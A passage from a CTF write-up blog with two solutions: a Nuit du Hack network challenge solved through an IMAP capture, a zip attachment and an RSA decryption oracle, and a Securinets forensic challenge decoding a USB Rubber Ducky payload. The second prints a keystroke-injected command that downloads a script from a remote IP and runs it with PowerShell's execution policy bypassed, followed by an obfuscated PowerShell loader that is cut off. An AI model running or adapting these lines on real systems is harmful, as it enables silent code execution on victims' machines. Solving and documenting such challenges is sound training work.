Reply-To)])\n* 17 FETCH (UID 17 RFC822.SIZE 844 FLAGS (\\Seen) BODY[HEADER.FIELDS (FROM TO CC BCC SUBJECT DATE MESSAGE-ID PRIORITY X-PRIORITY REFERENCES NEWSGROUPS IN-REPLY-TO CONTENT-TYPE REPLY-TO)] {406}\nSubject: Re: Private\nTo: salade &lt;salade@debian.yo&gt;\nReferences: &lt;6c9268e7-035b-0fa4-0486-c6624af41265@debian.yo&gt;\n &lt;5f8e93f0-9b6a-522f-f35a-3225bc919df7@debian.yo&gt;\nFrom: tomate &lt;tomate@debian.yo&gt;\nMessage-ID: &lt;9468245b-cfd1-4756-7fe4-0912efceaf9b@debian.yo&gt;\nDate: Thu, 21 Dec 2017 17:09:22 +0100\nIn-Reply-To: &lt;5f8e93f0-9b6a-522f-f35a-3225bc919df7@debian.yo&gt;\nContent-Type: text/plain; charset=utf-8\n\n)\n5 OK Fetch completed.\n6 IDLE\n+ idling\n* OK Still here\nDONE\n6 OK Idle completed.\n7 noop\n7 OK NOOP completed.\n8 UID fetch 18:* (FLAGS)\n* 17 FETCH (UID 17 FLAGS (\\Seen))\n8 OK Fetch completed.\n9 IDLE\n+ idling\nDONE\n9 OK Idle completed.\n10 append \"Sent\" (\\Seen) {2227+}\nTo: salade &lt;salade@debian.yo&gt;\nFrom: tomate &lt;tomate@debian.yo&gt;\nSubject: Private\nMessage-ID: &lt;3b6a11fe-60fb-f7b3-421e-29b5c0699eb9@debian.yo&gt;\nDate: Thu, 21 Dec 2017 17:12:57 +0100\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101\n Thunderbird/52.4.0\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"------------821D8D192BDE01EA2B1C5E07\"\nContent-Language: en-US\n\nThis is a multi-part message in MIME format.\n--------------821D8D192BDE01EA2B1C5E07\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 7bit\n\nThey also retrieved a public key and an interesting cipher text\n(attached documents).\n\nBesides, they also found a service at mydomainndh.ndh (port 55555) which\ndecrypts every text encrypted with the public key, apart from the\ninteresting one.\n\n\n--------------821D8D192BDE01EA2B1C5E07\nContent-Type: application/zip;\n name=\"docs.zip\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment;\n filename=\"docs.zip\"\n\nUEsDBAoAAAAAAFZ6lUsAAAAAAAAAAAAAAAAFABwAZG9jcy9VVAkAA8PCO1rdwjtadXgLAAEE\nAAAAAAQAAAAAUEsDBBQAAAAIALd5lUvQbcUR4wAAABABAAAPABwAZG9jcy9wdWJrZXkucGVt\nVVQJAAOawTtamsE7WnV4CwABBAAAAAAEAAAAAGXPvVaDMABA4Z2n6M7hlAoKjEmIIWDTRsQD\nbBESaKAHqBZant6f1Tve7bOsnyAmlG2OGXyhaJPg4vdZxp4StQc2QelEUvrhhBxDwDMAXMJA\niOCJJ7DhyI9Zy6iQHS91tfO3c1HK3dO8xEZeTcr/fNflBXHlicfbpSZjdOg7hL8EVolIUG76\n7EwCoO/SC1yXVlHkyb7QrT1Kaqy79PU6d+71efRANYAgdtb6EGdi3T6oocl7YS5qPca3KRig\nNxdAuW+lduwwS9WY0co4iWaxdat13Y5nqbC50BBwAI0/IWbhP/Q3UEsDBBQAAAAIAFZ6lUus\n24QeoQAAADUBAAAPABwAZG9jcy9jaXBoZXJUZXh0VVQJAAPDwjtaw8I7WnV4CwABBAAAAAAE\nAAAAABWPyREAQQgC/xuNFwL5J7bOS6pstWWJTYxoe/3qYopgqq6OQruta0ieSC8nAmvPMGJU\ndmics9wyyrkHpTRV0wVPZoYboT5GDCYmr+GHtrBhLuuGW4llFBXLTFgBbJPOEurBXQ6c0m1c\nxGlI0ZF9wq0L1SeoSkY/n+jtPLcLieaBhiYBAtmsZutOmad7MwzEiXVy4+6Z991gvMPi2ewk\n6/sBUEsBAh4DCgAAAAAAVnqVSwAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAGRvY3Mv\nVVQFAAPDwjtadXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAt3mVS9BtxRHjAAAAEAEAAA8A\nGAAAAAAAAQAAAKSBPwAAAGRvY3MvcHVia2V5LnBlbVVUBQADmsE7WnV4CwABBAAAAAAEAAAA\nAFBLAQIeAxQAAAAIAFZ6lUus24QeoQAAADUBAAAPABgAAAAAAAEAAACkgWsBAABkb2NzL2Np\ncGhlclRleHRVVAUAA8PCO1p1eAsAAQQAAAAABAAAAABQSwUGAAAAAAMAAwD1AAAAVQIAAAAA\n\n--------------821D8D192BDE01EA2B1C5E07--\n\n* 18 EXISTS\n* 1 RECENT\n10 OK [APPENDUID 1513610478 18] Append completed.\n11 noop\n11 OK NOOP completed.\n12 IDLE\n+ idling\n\n</code></pre></div></div>\n\n<p>해당 tcp frame 에는 아래와 같이, docs.zip 파일이 base64 encoding 되어 첨부되어 있는 것을 확인할 수 있으며, 이를 decode 한 뒤 동일하게 추출할 수 있었다.</p>\n\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>--------------821D8D192BDE01EA2B1C5E07\nContent-Type: application/zip;\n name=\"docs.zip\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment;\n filename=\"docs.zip\"\n\nUEsDBAoAAAAAAFZ6lUsAAAAAAAAAAAAAAAAFABwAZG9jcy9VVAkAA8PCO1rdwjtadXgLAAEE\nAAAAAAQAAAAAUEsDBBQAAAAIALd5lUvQbcUR4wAAABABAAAPABwAZG9jcy9wdWJrZXkucGVt\nVVQJAAOawTtamsE7WnV4CwABBAAAAAAEAAAAAGXPvVaDMABA4Z2n6M7hlAoKjEmIIWDTRsQD\nbBESaKAHqBZant6f1Tve7bOsnyAmlG2OGXyhaJPg4vdZxp4StQc2QelEUvrhhBxDwDMAXMJA\niOCJJ7DhyI9Zy6iQHS91tfO3c1HK3dO8xEZeTcr/fNflBXHlicfbpSZjdOg7hL8EVolIUG76\n7EwCoO/SC1yXVlHkyb7QrT1Kaqy79PU6d+71efRANYAgdtb6EGdi3T6oocl7YS5qPca3KRig\nNxdAuW+lduwwS9WY0co4iWaxdat13Y5nqbC50BBwAI0/IWbhP/Q3UEsDBBQAAAAIAFZ6lUus\n24QeoQAAADUBAAAPABwAZG9jcy9jaXBoZXJUZXh0VVQJAAPDwjtaw8I7WnV4CwABBAAAAAAE\nAAAAABWPyREAQQgC/xuNFwL5J7bOS6pstWWJTYxoe/3qYopgqq6OQruta0ieSC8nAmvPMGJU\ndmics9wyyrkHpTRV0wVPZoYboT5GDCYmr+GHtrBhLuuGW4llFBXLTFgBbJPOEurBXQ6c0m1c\nxGlI0ZF9wq0L1SeoSkY/n+jtPLcLieaBhiYBAtmsZutOmad7MwzEiXVy4+6Z991gvMPi2ewk\n6/sBUEsBAh4DCgAAAAAAVnqVSwAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAGRvY3Mv\nVVQFAAPDwjtadXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAt3mVS9BtxRHjAAAAEAEAAA8A\nGAAAAAAAAQAAAKSBPwAAAGRvY3MvcHVia2V5LnBlbVVUBQADmsE7WnV4CwABBAAAAAAEAAAA\nAFBLAQIeAxQAAAAIAFZ6lUus24QeoQAAADUBAAAPABgAAAAAAAEAAACkgWsBAABkb2NzL2Np\ncGhlclRleHRVVAUAA8PCO1p1eAsAAQQAAAAABAAAAABQSwUGAAAAAAMAAwD1AAAAVQIAAAAA\n\n--------------821D8D192BDE01EA2B1C5E07--\n</code></pre></div></div>\n\n<p>docs.zip 파일은 아래와 같이 <code class=\"highlighter-rouge\">cipherText</code>, <code class=\"highlighter-rouge\">private.pem</code> 2개의 파일을 포함하고 있었는데, cipherText 내용은 아래와 같으며, 결과적으로 문제에서 제시된 서버로, 해당 cipherText를 보낼경우, Decrypt Message를 return하는 것을 확인할 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network/docs\n nc kebabsto.challs.malice.fr 8888\nWhat message <span class=\"k\">do </span>you want to decrypt: ^C\n ✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network/docs\n <span class=\"nb\">cat</span> ./cipherText| nc kebabsto.challs.malice.fr 8888\n72873754879996948796542757182427480866384878894019674005699447004829908491467629529161961884224325941110935083467870715412599916138560976722953815670278067115980556377912852138532905866093650699880301357138301236748217037629036311469031537013958415575513723738671978421707050599317605219729945496472798064172\nWhat message <span class=\"k\">do </span>you want to decrypt:\n\nHere is the cleartext of your input :\n\n\n123360975347216093033775350245751721746535757669936\nWhat message <span class=\"k\">do </span>you want to decrypt: %\n</code></pre></div></div>\n\n<p>return 된 “123360975347216093033775350245751721746535757669936”를 hex 로 변환 후, 2글자씩 string 으로 decode 하면 아래와 같은 Password 문자열을 얻을 수 있다.</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Python</span> <span class=\"mf\">2.7</span><span class=\"o\">.</span><span class=\"mi\">10</span> <span class=\"p\">(</span><span class=\"n\">default</span><span class=\"p\">,</span> <span class=\"n\">Jul</span> <span class=\"mi\">15</span> <span class=\"mi\">2017</span><span class=\"p\">,</span> <span class=\"mi\">17</span><span class=\"p\">:</span><span class=\"mi\">16</span><span class=\"p\">:</span><span class=\"mi\">57</span><span class=\"p\">)</span>\n<span class=\"p\">[</span><span class=\"n\">GCC</span> <span class=\"mf\">4.2</span><span class=\"o\">.</span><span class=\"mi\">1</span> <span class=\"n\">Compatible</span> <span class=\"n\">Apple</span> <span class=\"n\">LLVM</span> <span class=\"mf\">9.0</span><span class=\"o\">.</span><span class=\"mi\">0</span> <span class=\"p\">(</span><span class=\"n\">clang</span><span class=\"o\">-</span><span class=\"mf\">900.0</span><span class=\"o\">.</span><span class=\"mi\">31</span><span class=\"p\">)]</span> <span class=\"n\">on</span> <span class=\"n\">darwin</span>\n<span class=\"n\">Type</span> <span class=\"s\">\"help\"</span><span class=\"p\">,</span> <span class=\"s\">\"copyright\"</span><span class=\"p\">,</span> <span class=\"s\">\"credits\"</span> <span class=\"ow\">or</span> <span class=\"s\">\"license\"</span> <span class=\"k\">for</span> <span class=\"n\">more</span> <span class=\"n\">information</span><span class=\"o\">.</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"s\">\"123360975347216093033775350245751721746535757669936\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"mi\">123360975347216093033775350245751721746535757669936</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)[</span><span class=\"mi\">2</span><span class=\"p\">:]</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span>\n<span class=\"s\">'54683173317332504073735f57307264254d306630L'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"p\">[:</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"s\">\"\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)</span><span class=\"o\">/</span><span class=\"mi\">2</span><span class=\"p\">):</span>\n<span class=\"o\">...</span>     <span class=\"n\">result</span> <span class=\"o\">+=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">int</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">:</span><span class=\"n\">i</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"o\">+</span><span class=\"mi\">2</span><span class=\"p\">],</span><span class=\"mi\">16</span><span class=\"p\">))</span>\n<span class=\"o\">...</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">result</span>\n<span class=\"s\">'Th1s1s2P@ss_W0rd</span><span class=\"si\">%</span><span class=\"s\">M0f0'</span>\n</code></pre></div></div>\n\n<p>위에서 얻은 <code class=\"highlighter-rouge\">Th1s1s2P@ss_W0rd%M0f0</code>를 이용해 이전에 압축 해제시 password 로 인해 풀지 못했던 <code class=\"highlighter-rouge\">slkfdsflj</code> 파일의 압축을 해제하면 아래와 같이 flag를 확인할 수 있었다.</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/flag.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] flag</p>\n\n<p align=\"right\"><strong>ndh2k18{M4k3M4tr10cHKa9r34T4g41n}</strong></p>\n\n    <article>\n    <div class=\"post-more\">\n      \n      <a href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      \n      <a href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  \n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\">\n        [2018_Securinets_CTF] duck_hunt(300)\n      </a>\n    </h1>\n\n    <span class=\"post-date\">26 Mar 2018</span>\n     |\n    \n    <a href=\"/blog/tags/#forensic\" class=\"post-tag\">Forensic</a>\n    \n    <a href=\"/blog/tags/#ducky\" class=\"post-tag\">ducky</a>\n    \n    \n\n    <article>\n      <h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Do you know someone who loves hunting ducks?\nLink: http://for.ctfsecurinets.com/8/unknown.bin</p>\n</blockquote>\n\n<p><img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>You can download a binary called “unknown.bin”. After download the “unknown.bin”, that is look like dummy binary.</p>\n\n<p>you need to know “duck” in exercise. that is “ducky”. ducky, which uses the mcu chip for usb and performs common operations, uses the result of the compilation “inject.bin”.(more important : “https://hakshop.com/products/usb-rubber-ducky-deluxe”)</p>\n\n<p>below site, you can decode that binary. “https://ducktoolkit.com/decoder/”\n<img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] decode site</p>\n\n<p>After Binary file decode, you can see that original “ducky code”.\n<img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode_file.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] original ducky code</p>\n\n<p>This is ducky code. you can see “http://34.240.44.38/payload.txt” about “GET url”.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>DELAY\nADELAY\nDELAY\nDELAY\n<span class=\"nb\">cd</span> / &amp; mkdir .haxor &amp; <span class=\"nb\">cd</span> .haxor &amp; <span class=\"nb\">echo</span> <span class=\"o\">(</span>curl <span class=\"nt\">-X</span> GET  http://34.240.44.38/payload.txt<span class=\"o\">)</span> <span class=\"o\">&gt;</span> file.PS1 &amp; powershell <span class=\"nt\">-ExecutionPolicy</span> ByPass <span class=\"nt\">-File</span> file.ps1\nDELAY\n\n</code></pre></div></div>\n\n<p>You can tell from the payload.txt that it is a powershell script, and seems to have a simple obfuscation. Nothing is a problem. This is “payload.txt” (powershell script)</p>\n<div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span><span class=\"o\">=</span>+<span class=\"k\">$()</span>;\n<span class=\"k\">${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n\\n<span class=\"k\">${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"s2\">\"}=\"</span><span class=\"p\">[</span><span class=\"s2\">\"+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"nv\">$?</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"p\">]</span><span class=\"s2\">\";\n</span><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span><span class=\"s2\">=\"\".(\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"nv\">$?</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">]);\n</span><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span><span class=\"s2\">=\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">]\n\"</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">(</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">(</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span 